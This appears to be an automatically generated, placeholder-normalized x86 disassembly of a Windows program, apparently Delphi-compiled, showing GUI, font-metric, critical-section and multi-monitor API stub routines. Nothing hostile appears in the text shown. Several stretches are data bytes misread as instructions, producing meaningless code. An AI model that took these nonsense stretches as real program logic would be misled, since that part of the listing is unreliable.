push esi
call GetTextMetricsA
test eax eax
je r-xdata
mov bl [ esp + 0x34 ]
sub_429610
push ebx
push esi
push edi
push 0x48
mov eax [ rw-data ]
push eax
push 0x8
call MulDiv
neg eax
mov [ rw-data ] eax
mov eax [ rw-data ]
cmp [ eax + 0xc ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
retn
call sub_4295cc
mov ebx eax
mov eax ebx
sub al 0x80
jne r-xdata
mov esi r-xdata
mov edi rw-data
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
push 0x48
mov eax [ rw-data ]
push eax
push 0x9
call MulDiv
neg eax
mov [ rw-data ] eax
mov [ rw-data ] bl
sub_4296dc
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
lea eax [ esi + 0x8 ]
push eax
call InitializeCriticalSection
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_429714
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax esi
call sub_42990c
lea eax [ esi + 0x8 ]
push eax
call DeleteCriticalSection
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_429758
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_429740
xor eax eax
push ebp
push sub_4297f9
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0x8 ] eax
jmp r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp ebx [ eax + 0x8 ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429800
mov eax [ ebp - 0x4 ]
call sub_42974c
retn
mov eax 0x10
call sub_4026ec
mov [ ebp - 0x8 ] eax
mov edi [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
mov [ edi ] eax
mov ecx esi
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_42980c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] ebx
mov [ edi + 0xc ] esi
mov eax [ ebp - 0x4 ]
mov edx [ ebp - 0x8 ]
mov [ eax + 0x4 ] edx
mov eax [ ebp - 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
cmp esi [ eax + 0xc ]
jne r-xdata
sub_42980c
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov ebx edx
mov dl 0x1
mov eax [ r-xdata ]
call sub_427864
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4298eb
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov edx 0x8
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebp - 0x8 ]
call sub_427e2c
mov edi eax
mov eax [ edi + 0x14 ]
xor edx edx
call sub_424ac0
mov eax [ edi + 0x14 ]
mov edx ebx
call sub_4249a4
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x20 ]
push eax
lea eax [ ebp - 0x18 ]
push eax
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx + 0x2c ]
mov ecx eax
xor edx edx
xor eax eax
call sub_417264
lea edx [ ebp - 0x18 ]
mov eax edi
call sub_424d48
xor esi esi
mov edx ebx
and edx 0x80000001
jns r-xdata
dec eax
or eax 0xfffffffe
inc eax
cmp eax edx
jne r-xdata
dec edx
or edx 0xfffffffe
inc edx
inc ebx
cmp ebx 0x9
jne r-xdata
mov eax [ ebp - 0x4 ]
push eax
mov ecx esi
mov edx ebx
mov eax edi
call sub_425124
mov eax esi
and eax 0x80000001
jns r-xdata
inc esi
cmp esi 0x9
jne r-xdata
xor ebx ebx
mov eax [ ebp - 0x8 ]
call sub_427ae8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x8 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_42990c
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x4 ] eax
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429740
xor eax eax
push ebp
push sub_429957
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42995e
mov eax [ ebp - 0x4 ]
call sub_42974c
retn
mov esp ebp
pop ebp
retn
sub_42995e
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x8 ]
call sub_40270c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
test eax eax
jne r-xdata
call sub_403368
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
call sub_429740
xor eax eax
push ebp
push sub_429957
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
mov eax [ eax ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42995e
mov eax [ ebp - 0x4 ]
call sub_42974c
retn
mov esp ebp
pop ebp
retn
sub_429984
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ rw-data ] 0x0
je r-xdata
xor eax eax
pop esi
pop ebx
retn
mov eax esi
call sub_423d18
push eax
mov eax ebx
call sub_423d18
mov edx eax
mov eax [ rw-data ]
pop ecx
call sub_429758
mov eax [ eax + 0x4 ]
pop esi
pop ebx
retn
sub_4299bc
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429a85
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429a8c
retn
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
call sub_426aa0
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
call sub_403368
mov eax [ rw-data ]
push eax
call DeleteObject
push rw-data
call DeleteCriticalSection
push rw-data
call DeleteCriticalSection
mov eax rw-data
mov ecx 0x12
mov edx [ r-xdata ]
call sub_404c00
mov eax rw-data
mov ecx 0x34
mov edx [ r-xdata ]
call sub_404c00
sub_429a90
sub [ rw-data ] 0x1
jae r-xdata
retn
call sub_429594
push rw-data
call InitializeCriticalSection
push rw-data
call InitializeCriticalSection
push 0x7
call GetStockObject
mov [ rw-data ] eax
push 0x5
call GetStockObject
mov [ rw-data ] eax
push 0xd
call GetStockObject
mov [ rw-data ] eax
push 0x7f00
push 0x0
call LoadIconA
mov [ rw-data ] eax
call sub_429610
mov cx 0x2c
mov dl 0x1
mov eax [ sub_42345c ]
call sub_4234d0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_42345c ]
call sub_4234d0
mov [ rw-data ] eax
mov cx 0x10
mov dl 0x1
mov eax [ sub_42345c ]
call sub_4234d0
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_4296dc
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ rw-data ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_418b0c
mov [ rw-data ] eax
mov ecx sub_423d28
mov edx sub_423d38
mov eax [ r-xdata ]
call sub_418060
mov ecx r-xdata
mov edx sub_423f40
mov eax [ r-xdata ]
call sub_418060
sub_429b9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429bc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429bc8
retn
sub_429bd8
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ edx + eax * 2 + 0x1400 ] bl
add al cl
pop edi
inc ecx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ edi + eax * 4 ] ah
inc ecx
add al cl
mov [ ecx ] al
pop esp
popfd
inc edx
add [ eax - 0x79 ] bh
inc ecx
add ah dh
xchg [ ecx ] eax
or edx [ edi + ecx * 2 + 0x62 ]
push 0x65
arpl [ esp + ecx * 2 + 0x69 ] si
jae r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cld
mov [ edx + eax * 2 ] bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + ebx * 4 + 0x80042 ] dl
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah ah
popfd
inc edx
add [ ebx + ebp + 0x40 ] cl
add [ eax ] ch
sahf
inc edx
add [ esi + ebx * 4 ] dl
inc edx
add [ esp + edx * 2 ] cl
dec edi
jb r-xdata
cli
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
arpl [ ebx - 0x70 ] bp
push esp
push ebx
je r-xdata
jb r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418b08
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
pushfd
inc edx
add [ eax ] cl
add [ eax ] al
add [ esp + ebx * 4 ] bh
inc edx
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add ah ah
popfd
inc edx
add [ eax - 0x62 ] cl
inc edx
add [ eax ] ch
sahf
inc edx
add [ esi + ebx * 4 ] dl
inc edx
add [ esi ] al
dec esp
imul esi [ ebx + 0x74 ] 0xf000408d
pushfd
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah bh
mov eax edi
call sub_403368
sub_429d04
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov [ esi + 0x10 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_429d5c
push ebx
push esi
push edi
mov ebx ecx
mov edi edx
mov esi eax
cmp [ esi + 0x10 ] 0x0
je r-xdata
mov ecx ebx
mov edx edi
mov eax esi
call sub_418b08
pop edi
pop esi
pop ebx
retn
cmp bl 0x2
jne r-xdata
mov eax edi
call sub_403368
sub_429da0
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403338
mov dl 0x1
mov eax [ r-xdata ]
call sub_403338
mov [ esi + 0x4 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4036b4
mov eax esi
pop esi
pop ebx
retn
call sub_40370c
pop [ fs : 0x0 ]
add esp 0xc
sub_429de4
push ebx
push esi
call sub_40371c
mov ebx edx
mov esi eax
mov eax [ esi + 0x4 ]
call sub_403368
mov edx ebx
and dl 0xfc
mov eax esi
call sub_403358
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403704
sub_429e28
push ebx
push esi
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov esi eax
mov eax [ ebx + 0x4 ]
mov edx [ eax + 0x8 ]
dec edx
call sub_418790
mov eax esi
pop esi
pop ebx
retn
sub_429e54
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_429e79
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_429e80
retn
sub_429e94
cmp [ rw-data ] 0x0
jne r-xdata
retn
push r-xdata
call GetModuleHandleA
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
je r-xdata
push r-xdata
mov eax [ rw-data ]
push eax
call GetProcAddress
mov [ rw-data ] eax
sub_429ef4
push ebx
mov ebx eax
cmp [ rw-data ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_429e94
xor eax eax
jmp r-xdata
push ebx
call [ rw-data ]
test eax eax
jne r-xdata
neg al
sbb eax eax
pop ebx
retn
mov al 0x1
sub_429fe4
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1203
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a080
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x100a
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a0ac
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
push edi
push esi
push 0x1012
push ebx
call SendMessageA
pop edi
pop esi
pop ebx
retn
sub_42a0d8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a0fd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a104
retn
sub_42a110
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] ecx
mov edi edx
mov ebx eax
mov eax [ ebp - 0x4 ]
call sub_404614
xor eax eax
push ebp
push sub_42a1cf
push [ fs : eax ]
mov [ fs : eax ] esp
xor esi esi
xor eax eax
mov al bl
cmp [ eax + rw-data ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a1d6
lea eax [ ebp - 0x4 ]
call sub_404164
retn
cmp [ rw-data ] 0x0
je r-xdata
xor esi esi
test bl bl
jne r-xdata
test bl bl
je r-xdata
mov esi edi
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_404624
push eax
mov eax [ rw-data ]
push eax
call GetProcAddress
mov esi eax
jmp r-xdata
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
mov al bl
mov [ eax + rw-data ] 0x1
mov [ rw-data ] 0x1
test esi esi
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a110
mov [ rw-data ] eax
cmp [ rw-data ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
call sub_404164
sub_42a1f8
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
or eax 0xffffffff
mov edx ebx
add edx 0xffffffb4
sub edx 0x2
jb r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
xor eax eax
call sub_42a110
mov [ rw-data ] eax
push ebx
call [ rw-data ]
jmp r-xdata
xor eax eax
jmp r-xdata
je r-xdata
pop ebx
pop ebp
retn 0x4
cmp eax 0xffffffff
jne r-xdata
xor ebx ebx
jmp r-xdata
dec edx
je r-xdata
push ebx
call GetSystemMetrics
mov ebx 0x1
dec edx
sub edx 0x2
jae r-xdata
mov eax 0x1
jmp r-xdata
sub_42a280
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov ebx [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor esi esi
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x2
call sub_42a110
mov [ rw-data ] eax
push edi
push ebx
call [ rw-data ]
mov esi eax
jmp r-xdata
mov esi 0x12340042
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0xc ] 0x0
jle r-xdata
push 0x0
call [ rw-data ]
cmp eax [ ebx ]
jle r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebx + 0x4 ]
jle r-xdata
sub_42a310
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
mov ebx [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
mov eax ebx
and eax 0x3
test al al
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x1
call sub_42a110
mov [ rw-data ] eax
push ebx
push esi
call [ rw-data ]
jmp r-xdata
push esi
call IsIconic
test eax eax
je r-xdata
mov eax 0x12340042
jmp r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
lea eax [ ebp - 0x10 ]
push eax
push esi
call GetWindowRect
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetWindowPlacement
jmp r-xdata
push ebx
lea eax [ ebp - 0x10 ]
push eax
call sub_42a280
sub_42a3a6
add [ eax ] al
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x10 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
mov eax edi
and eax 0x3
test al al
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x3
call sub_42a110
mov [ rw-data ] eax
push edi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov ebx 0x12340042
mov esi [ ebp + 0x8 ]
test esi esi
jl r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
pop ebp
retn 0xc
push 0x0
call [ rw-data ]
cmp esi eax
jge r-xdata
cmp [ ebp + 0xc ] 0x0
jl r-xdata
push 0x1
call [ rw-data ]
cmp eax [ ebp + 0xc ]
jle r-xdata
sub_42a427
call [ eax ]
add [ eax ] al
add [ ebp + 0x6f ] cl
outsb
imul esi [ edi + ebp * 2 + 0x72 ] 0x6d6f7246
push eax
outsd
imul ebp [ esi + 0x74 ] 0x0
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x4
call sub_42a110
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a514
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x5
call sub_42a110
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a5e8
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov esi [ ebp + 0xc ]
mov edi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp edi 0x12340042
jne r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x6
call sub_42a110
mov [ rw-data ] eax
push esi
push edi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
test esi esi
je r-xdata
cmp [ esi ] 0x28
jb r-xdata
push 0x0
lea eax [ ebp - 0x10 ]
push eax
push 0x0
push 0x30
call SystemParametersInfoA
test eax eax
je r-xdata
xor eax eax
mov [ esi + 0x4 ] eax
xor eax eax
mov [ esi + 0x8 ] eax
push 0x0
call [ rw-data ]
mov [ esi + 0xc ] eax
push 0x1
call [ rw-data ]
mov [ esi + 0x10 ] eax
push esi
lea edi [ esi + 0x14 ]
lea esi [ ebp - 0x10 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov [ esi + 0x24 ] 0x1
cmp [ esi ] 0x4c
jb r-xdata
mov bl 0x1
push r-xdata
lea eax [ esi + 0x28 ]
push eax
call lstrcpyA
sub_42a6bc
push ebp
mov ebp esp
add esp 0xffffffd4
push ebx
push esi
push edi
mov edi [ ebp + 0xc ]
mov esi [ ebp + 0x8 ]
cmp [ rw-data ] 0x0
jne r-xdata
xor ebx ebx
cmp [ ebp + 0x10 ] 0x0
je r-xdata
mov ecx r-xdata
mov edx [ rw-data ]
mov al 0x7
call sub_42a110
mov [ rw-data ] eax
mov eax [ ebp + 0x14 ]
push eax
mov eax [ ebp + 0x10 ]
push eax
push edi
push esi
call [ rw-data ]
mov ebx eax
jmp r-xdata
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x10
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
push 0x0
call [ rw-data ]
mov [ ebp - 0x14 ] eax
push 0x1
call [ rw-data ]
mov [ ebp - 0x10 ] eax
test esi esi
je r-xdata
test edi edi
je r-xdata
lea eax [ ebp - 0x2c ]
push eax
push esi
call GetClipBox
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x8 ]
push eax
push esi
call GetDCOrgEx
test eax eax
je r-xdata
mov eax [ ebp + 0x14 ]
push eax
lea eax [ ebp - 0x1c ]
push eax
push esi
push 0x12340042
call [ ebp + 0x10 ]
mov ebx eax
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
mov eax [ ebp - 0x4 ]
neg eax
push eax
mov eax [ ebp - 0x8 ]
neg eax
push eax
lea eax [ ebp - 0x1c ]
push eax
call OffsetRect
lea eax [ ebp - 0x2c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
je r-xdata
mov bl 0x1
jmp r-xdata
push edi
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x1c ]
push eax
call IntersectRect
test eax eax
jne r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0xc ] 0x1
jne r-xdata
mov bl 0x1
jmp r-xdata
sub_42a857
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_42a87d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a884
retn
sub_42a898
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_42a8bd
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_42a8c4
retn
sub_42a9b8
unpckhps xmm1 [ ecx + 0x53 ]
jae r-xdata
arpl [ ecx + 0x61 ] bp
insb
push edi
imul ebp [ esi + 0x48 ] 0x56706c65
lea eax [ eax ]
js r-xdata
add bh bh
dec [ ebp - 0x5587ffc0 ]
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
push cs
inc edx
add [ eax ] al
add [ eax ] al
jb r-xdata
test eax 0x66010042
xchg ebx eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x56 ] bh
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
js r-xdata
cld
test eax 0x66010042
xchg ebx eax
jb r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
add ah cl
jae r-xdata
jae r-xdata
inc edx
add [ eax + eax ] cl
add [ eax ] al
int3
jl r-xdata
adc [ eax ] eax
add [ ebx + edx * 4 - 0x4 ] esp
test eax 0xc0f0042
dec ecx
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add ah bl
stosb [ edi ]
inc edx
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh ch
stosb [ edi ]
inc edx
add [ eax + eax ] cl
add [ eax ] al
mov al 0x10
inc eax
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
inc eax
add [ eax ] al
xor eax [ eax ]
sbb al 0x33
inc eax
add [ eax + 0x33 ] bl
inc eax
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add [ ecx + ebp * 4 ] bh
add [ eax - 0x5bffbfcb ] bl
xor eax 0x35a80040
inc eax
add [ ebp + esi + 0x35a00040 ] ch
dec eax
insb
jo r-xdata
add bh bh
dec [ ebx + 0x42a9f8c0 ]
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
inc edx
jns r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
stosb [ edi ]
popad
outsb
popad
jb r-xdata
add al al
dec edi
jae r-xdata
xor [ edx ] ecx
add [ eax ] al
add eax 0xffffffd4
jmp r-xdata
imul esp [ ebp + 0x77 ] 0x6f4e7265
mov eax eax
push esi
je r-xdata
jo r-xdata
cmp cl [ ecx ]
add [ edi ] cl
or al 0x49
inc edx
outsb
dec eax
insb
jo r-xdata
insb
je r-xdata
add [ edi ] cl
outsb
je r-xdata
add [ eax - 0x56 ] bh
jns r-xdata
adc [ eax ] eax
add [ esi - 0x6d ] esp
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
insb
jo r-xdata
cmp cl [ ecx ]
dec eax
insb
jo r-xdata
jo r-xdata
test eax 0x150f0042
dec ecx
push ebx
add bh bh
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push 0x0
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x4 ] edx
mov esi eax
xor eax eax
push ebp
push sub_42b663
push [ fs : eax ]
mov [ fs : eax ] esp
test ebx ebx
je r-xdata
inc edx
add [ eax + eax ] al
insd
inc ebp
js r-xdata
dec eax
insb
jo r-xdata
insb
arpl [ gs : edi + ebp * 2 + 0x72 ] si
and al 0x11
inc eax
add [ ecx ] al
pop eax
xchg ebx eax
cld
mov al 0xe
pop edi
rcl [ ecx ] cl
mov [ 0x4fc000b9 ] eax
jns r-xdata
